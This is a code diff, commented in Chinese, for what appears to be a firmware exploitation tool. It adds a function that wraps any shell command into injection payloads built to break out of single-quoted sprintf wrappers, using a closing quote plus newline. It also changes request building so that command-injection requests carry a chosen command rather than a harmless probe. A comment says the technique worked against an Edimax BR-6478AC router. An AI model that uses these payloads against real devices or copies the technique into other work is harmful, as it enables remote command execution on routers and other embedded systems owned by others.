@@ -60,16 +60,37 @@ def guess_param(chain: dict) -> str:
     return m or "input"
 
 
+def shell_payloads(cmd: str) -> list[str]:
+    """把一条任意 shell 命令包成几种能突破常见包装的形态。
+
+    固件里命令常写成 `sprintf(buf, "echo '%s' > /tmp/x", param)` —— 值被单引号
+    包住，很多实现还会在第一个 `;` 处截断。所以 `;id;` 打不进去，
+    真正有效的是「单引号闭合 + 换行」。实测 Edimax BR-6478AC 就是这样打通的。
+    """
+    return [
+        f"x'\n{cmd}\n'",      # 闭引号 + 换行：最通用
+        f"x'\n{cmd}\n",       # 有的实现最后没有收尾引号
+        f"{cmd}",             # 无包装的情况
+        f";{cmd};",           # 经典（会被分号截断的实现无效）
+    ]
+
+
 def build_requests(chain: dict, endpoint: dict | None = None,
-                   port: int = 8080, host: str = "127.0.0.1") -> list[dict]:
-    """为一条链生成一组候选请求（每个载荷一条）。"""
+                   port: int = 8080, host: str = "127.0.0.1",
+                   cmd: str | None = None) -> list[dict]:
+    """为一条链生成一组候选请求（每个载荷一条）。
+
+    `cmd` 只对命令注入类有意义：给了就用它替换通用载荷，
+    这样工具不再只是「打一发 id」，而是真的执行指定命令。
+    """
     fn = chain.get("function") or "unknown"
     uri = (endpoint or {}).get("uri") or ""
     path = guess_path(fn, uri)
     param = guess_param(chain)
     cat = (chain.get("sink_category") or "").lower()
+    values = shell_payloads(cmd) if (cmd and cat in ("ci", "cmd")) else payloads(cat)
     out = []
-    for value in payloads(cat):
+    for value in values:
         body = urllib.parse.urlencode({param: value})
         out.append({
             "function": fn,
